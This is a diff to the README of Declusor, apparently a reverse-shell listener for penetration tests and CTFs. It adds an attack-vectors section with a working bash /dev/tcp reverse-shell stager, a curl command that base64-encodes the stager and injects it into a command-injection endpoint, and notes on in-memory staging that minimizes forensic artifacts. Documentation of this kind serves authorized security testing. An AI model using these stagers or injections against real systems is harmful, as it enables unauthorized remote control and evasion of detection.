@@ -29,28 +29,72 @@
 
 ## Why Declusor?
 
-Catching a reverse shell during a CTF or penetration test shouldn't feel like walking a tightrope:
+Catching a reverse shell during a penetration test, CTF, or security assessment shouldn't feel like walking a tightrope:
 
-- **Netcat is a little too minimal**: You get your shell, hit `Ctrl+C` by accident, and suddenly you're back to Googling PTY one-liners and pasting base64 blobs like it's 1995.
-- **C2 frameworks are a bit much**: Sometimes you just want to catch a shell and run `id`. You don't need twelve containers, a database, and a team server for that.
+- **Netcat is a little too minimal**: You get your shell, hit `Ctrl+C` by accident, and suddenly you're back to Googling PTY one-liners. Stabilizing requires Googling PTY one-liners (`python -c 'import pty; ...'`), running `stty raw -echo`, and hoping binary transfers don't corrupt the socket.
+- **Many C2 frameworks are a bit much**: Sometimes you just want to catch a shell and run `id`. You don't need twelve containers, a database, and a team server for that.
 - **Raw sockets don't handle drama well**: A few lines of socket code work great — until the connection drops, binary data shows up, or the shell does something you didn't expect.
 
-So I built **Declusor**: the simplicity of a raw listener, with the interactive features you'd actually want — history, completion, script staging, and an extensible transport layer without turning the whole thing into a science experiment.
+## Practical Usage & Attack Vectors
+
+Declusor is purpose-built to turn unauthenticated Remote Code Execution (RCE) and Command Injection vulnerabilities into stable, feature-rich operator sessions.
+
+### Common Vector 1: Web OS Command Injection
+
+When testing an injection point in an HTTP query or form parameter (e.g., a vulnerable diagnostic `ping` or export function):
+
+```http
+POST /api/diagnostics/ping HTTP/1.1
+Host: vulnerable-target.local
+Content-Type: application/json
+
+{"ip": "127.0.0.1; <STAGER_PAYLOAD>"}
+```
+
+1. **Launch Listener**: Start Declusor locally on your interface:
+   ```bash
+   declusor 10.10.14.5 4444 --plugin shell_socket
+   ```
+2. **Inject Stager**: Declusor immediately prints the tailored launcher one-liner. Base64-encode it to avoid character-filtering issues (`&`, `;`, `|`, spaces):
+
+   ```bash
+   # Encode the stager displayed by Declusor
+   PAYLOAD=$(echo -n '( exec 3<> /dev/tcp/10.10.14.5/4444; while IFS= read -d "" -r data; do [ -z "$data" ] && break; eval "$data" >&3 2>&3; printf "\x06" >&3; done <&3; exec 3>&- )' | base64 -w0)
+
+   # Inject via curl
+   curl -s -X POST https://vulnerable-target.local/api/diagnostics/ping \
+     -H "Content-Type: application/json" \
+     -d "{\"ip\": \"127.0.0.1; echo $PAYLOAD | base64 -d | bash\"}"
+   ```
+
+3. **Instant Stabilized Session**: Upon connection, Declusor runs its in-memory handshake, pushes helper utilities, and opens an interactive REPL with full history and tab-completion—**zero manual PTY gymnastics required**.
+
+### Common Vector 2: Python Deserialization & Template Injections (SSTI)
+
+When exploiting Python environments (Jinja2 SSTI, unsafe `pickle.loads`, or arbitrary code execution in AI/ML model loaders):
+
+1. **Launch with Python Transport**:
+   ```bash
+   declusor 10.10.14.5 4444 --plugin py_socket
+   ```
+2. **Execute Cross-Platform Agent**: Declusor outputs a pure standard-library Python client (`py_socket_client.py`) that operates identically on Linux, macOS, and Windows without external dependencies (`bash` or `nc` are not needed).
+
+---
 
 ## See It in Action
 
 <p align="center">
   <img src="docs/assets/demo.gif" alt="Declusor Interactive Demo" width="900" onerror="this.onerror=null;this.src='https://i.imgur.com/Wsw2l90.gif';"/>
   <br>
-  <em>From listener startup to remote execution in seconds: Catching a reverse shell, navigating with tab-completion, and loading modules in-memory.</em>
+  <em>From listener startup to remote execution in seconds: Catching a reverse shell, navigating with tab-completion, and staging modules in-memory.</em>
 </p>
 
-When an operator launches Declusor, the entire engagement workflow is automated and streamlined:
+When an operator launches Declusor, the entire engagement workflow is automated:
 
-1. **Automatic Stager Generation**: Declusor starts the listener and immediately displays the ready-to-run launcher command for the target system.
-2. **Deterministic Handshake & Sentinel ACK**: Upon connection, the framework verifies the remote transport, transmits helper libraries in-memory, and negotiates framed communication without requiring manual PTY acrobatics.
-3. **Interactive Readline Environment**: The operator gains full command recall, history search, and tab-completion for remote commands and local filesystem paths.
-4. **Clean In-Memory Payload Execution**: Modules and post-exploitation scripts are staged directly into remote memory, minimizing forensic artifacts on disk.
+1. **Automatic Stager Generation**: Starts the listener and immediately displays ready-to-inject launcher commands for the target environment.
+2. **Deterministic Handshake & Sentinel ACK**: Upon connection, the framework verifies the remote transport, transmits helper libraries in-memory, and negotiates framed communication with sentinel ACKs to prevent socket desynchronization.
+3. **Interactive Readline Environment**: Provides full command recall (`Up`/`Down`), history search (`Ctrl+R`), and tab-completion for remote executables and local paths.
+4. **Clean In-Memory Payload Execution**: Modules and post-exploitation scripts are staged directly into remote process memory, eliminating temporary files in `/tmp` and minimizing disk forensics.
 
 | Operational Phase        | Operator Experience                          | Target Impact                         |
 | :----------------------- | :------------------------------------------- | :------------------------------------ |
